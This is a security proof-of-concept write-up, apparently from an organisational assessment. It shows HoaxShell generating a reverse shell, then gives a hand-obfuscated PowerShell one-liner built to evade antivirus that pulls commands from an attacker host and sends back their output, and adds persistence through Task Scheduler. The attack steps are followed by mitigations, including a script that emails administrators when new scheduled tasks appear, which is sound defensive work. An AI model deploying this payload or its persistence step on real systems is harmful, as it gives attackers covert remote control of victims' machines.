# POC 4 - Reverse Shell to Remain on Device

## Description

A reverse shell attack is an attack which allows attacker to open ports within the victim's machine. These opened ports allow the attackers to remotely access the victims organisation's network. 

These reverse shell's may be difficult to detect as threat actors may build more complex scripts to evade both the firewall implemented within the system as well as the antivirus implemented.

This attack aims to outline the threats posed to the organisation from a reverse shell attack. 

## Steps to Carry Out Exploitation

1. Git clone the Hoax Shell repository

```sh
git clone https://github.com/t3l3machus/hoaxshell.git
```

2. Navigate into the repository and install all dependencies

```sh
# Navigate into the repository
cd ./hoaxshell

# Install dependencies
python -m pip install -r requirements.txt
```

3. Run the following shell to generate the Hoaxshell payload

```sh
sudo python3 hoaxshell.py -s <your_ip> -r -H "Authorization"
```

![Generating Payload using HoaxShell](/images/POC_4/Exploitation/POC4_Generating_Payload.png)

4. Manually obfuscating HoaxShell Script by adding `'` and `splitting strings of character`, and `randomising casing of PowerShell functions`

```ps1
$xxx='None';$s='<your_ip>:8080';$i='83d2a6b0-c13433e2-5ea52d90';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/83d2a6b0 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/c13433e2 -Headers @{"Authorization"=$i}).Content;if ($c -ne $xxx) {$r=i''e''x $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/5ea52d90 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
```

5. Run the following within a PowerShell session or Command Prompt

Command Prompt
```cmd
powershell $xxx='None';$s='<your_ip>:8080';$i='83d2a6b0-c13433e2-5ea52d90';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/83d2a6b0 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/c13433e2 -Headers @{"Authorization"=$i}).Content;if ($c -ne $xxx) {$r=i''e''x $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/5ea52d90 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
```

PowerShell
```ps1
$xxx='None';$s='<your_ip>:8080';$i='83d2a6b0-c13433e2-5ea52d90';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/83d2a6b0 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/c13433e2 -Headers @{"Authorization"=$i}).Content;if ($c -ne $xxx) {$r=i''e''x $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/5ea52d90 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
```

6. Notice that the attacker machine would have a shell session established after the command has been ran

![HoaxShell Connection Established](/images/POC_4/Exploitation/POC4_HoaxShell_Session.png)

7. Run the following command on the attacker system to confirm that the attacker machine is connected and able to retrieve information from the organisations device

![Listing of Victim's machine directory from HoaxShell exploit script](/images/POC_4/Exploitation/POC4_Directry_Listing_from_HoaxShell.png)

8. Save the PowerShell script and run it on startup using Task Scheduler

9. Run the following command to grab the session mode when the shell has been closed on the attacker machine but is still running on the organisations device

```sh
sudo python3 hoaxshell.py -s <your_ip> -g
```

## Possible Mitigations and Recommendations

1. [Notify Administrators of New Scheduled Tasks](#notify-administrators-of-new-scheduled-tasks)
2. Disable unused ports and consider using a destination net
3. Configure the firewall to allow only required application's application ID*
4. Update antivirus signature database

**NOTE**
*Only applicable to Layer 7 Firewalls

### Notify Administrators of New Scheduled Tasks

While tasks are being constantly scheduled within systems to perform an update of system, scanning for malicious files, etc., threat actors can make use of scheduled tasks as an advantage to schedule exploits to run on start up or at different times of the day. 

To combat this, one method is to notify the administrators of any new scheduled tasks to allow administrators to further look into and investigate any newly scheduled task which may pose a potential threat towards the organisations active directory. 

#### Steps to Notify Administrators of New Scheduled Tasks

1. Create a PowerShell script like the following modifying the information accordingly

```ps1
# Define the event ID to monitor for task creation
$EventId = 106

# Get the latest event that matches the specified event ID from the Task Scheduler log
$Event = Get-WinEvent -MaxEvents 1 -FilterHashTable @{
    LogName = 'Microsoft-Windows-TaskScheduler/Operational'
    ID = $EventId
} | Select-Object Id, Message, MachineName, ProviderName

# Check if an event is found
if ($Event) {
    # Email configuration
    $EmailFrom = "your-email@example.com"
    $EmailTo = "recipient@example.com"
    $Subject = "Task Created Alert - $($Event.MachineName)"
    $Body = "EventID: $($Event.Id)`nSource: $($Event.ProviderName)`nMachineName: $($Event.MachineName)`nMessage: $($Event.Message)"

    # SMTP Server configuration for a generic mail server
    $SMTPServer = "mail.example.com"
    $SMTPPort = 587
    $SMTPUsername = "your-email@example.com"
    $encrypted = Get-Content c:scriptsencrypted_password.txt | ConvertTo-SecureString
    $credential = New-Object System.Management.Automation.PsCredential($SMTPUsername, $encrypted)

    # Create and configure the SMTP client
    $SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, $SMTPPort)
    $SMTPClient.EnableSsl = $true
    $SMTPClient.Credentials = $credential

    # Send the email
    $SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)

    Write-Host "Email sent successfully."
} else {
    Write-Host "No matching event found."
}
```

2. Test that the email is able to be sent by running the PowerShell Script

3. Open `Event Viewer` and navigate to the following path `Applications and Services > Microsoft > Windows > Task Scheduler > Operational`

![Event Viewer Task Scheduler Operational Tab](/images/POC_1/Mitigation/Notify_New_Tasks/POC1_Event_Viewer_Task_Scheduler_Operational_Tab.png)

4. Filter the current log to show all logs with an `Event ID` of `106`

![Filtering Event Log with Event ID 106](/images/POC_1/Mitigation/Notify_New_Tasks/POC1_Event_Viewer_Filter_By_Event_ID.png)

![Filtered Event Log](/images/POC_1/Mitigation/Notify_New_Tasks/POC1_Event_Viewer_Filtered_Log.png)

5. Right Click the Task and `Attach Task To This Event`

![Right Click Options](/images/POC_1/Mitigation/Notify_New_Tasks/POC1_Event_Viewer_Task_Options.png)

6. Create the task with the following details

**General Tab**
|Options|Value|
|--|--|
|Name|NewScriptAlert|
|Description|Alert Administrators of any new scripts created|

![Creating Basic Task](/images/POC_1/Mitigation/Notify_New_Tasks/POC1_Creating_Basic_Task.png)

**New Action Tab**
|Options|Value|
|--|--|
|Action|Start a program|
|Program/script|C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe|
|Add arguments (optional)|<Path/To/File>|

![Task Scheduler Actions Options](/images/POC_1/Mitigation/Notify_New_Tasks/POC1_Basic_Task_Scheduler_Actions.png)

7. Verify that the settings are configured as per follows

![Task Scheduler Summary](/images/POC_1/Mitigation/Notify_New_Tasks/POC1_Basic_Task_Scheduler_Summary.png)

8. Check the `Open Properties dialog for the task when I click Finish` option

9. Further modify the following from the properties dialog

**General Tab**

![Task Scheduler General](/images/POC_1/Mitigation/Notify_New_Tasks/POC1_Task_Scheduler_General.png)

**Conditions Tab**

![Task Scheduler Conditions](/images/POC_1/Mitigation/Notify_New_Tasks/POC1_Task_Scheduler_Conditions.png)

**Settings Tab**

![Task Scheduler Settings](/images/POC_1/Mitigation/Notify_New_Tasks/POC1_Task_Scheduler_Settings.png)

**Account Login Prompt**

![Task Scheduler Account Login](/images/POC_1/Mitigation/Notify_New_Tasks/POC1_Task_Scheduler_Account_Login.png)

10. Trigger the task and check that an email notification is triggered

## References

[Hoax Shell](https://github.com/t3l3machus/hoaxshell)  
[What is Reverse Shell](https://www.imperva.com/learn/application-security/reverse-shell/)  
[Manually Obfuscating Hoax Shell Payload](https://www.youtube.com/watch?v=iElVfagdCD4)  
